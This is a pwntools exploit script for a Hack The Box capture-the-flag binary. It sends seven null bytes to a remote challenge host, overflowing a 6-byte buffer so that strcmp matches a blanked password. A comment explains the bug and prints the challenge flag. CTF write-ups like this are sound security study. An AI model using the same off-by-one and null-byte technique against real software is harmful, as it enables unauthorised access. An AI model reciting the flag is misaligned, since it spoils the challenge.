#!/usr/bin/env python3

from pwn import *

exe = './writing_on_the_wall'
elf = context.binary = ELF(exe,checksec=False)
context.log_level='debug'

#p = process(exe)
p = remote('83.136.251.7',38037)

nullbyte = 0x00

payload = flat(
    7*nullbyte
    )

p.sendlineafter(b'>> ',payload)
p.interactive()

'''
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./glibc/'

buffer size that will be read is 7 bytes but space allocated is only 6 byes
Buffer value is compared to the password which is 'w3tpass '(a space at the end) which is 8 bytes but we can only write 7 bytes
Then strcmp operation on our input and the password
strcmp works on c strings and it reads until it finds null byte \x00 if we can input 7 times null bytes, our input will we null byte and the password variables first byte will also be overwritten to null byte so both strings null bytes and it will be true and we get flag
Flag : HTB{3v3ryth1ng_15_r34d4bl3}
'''
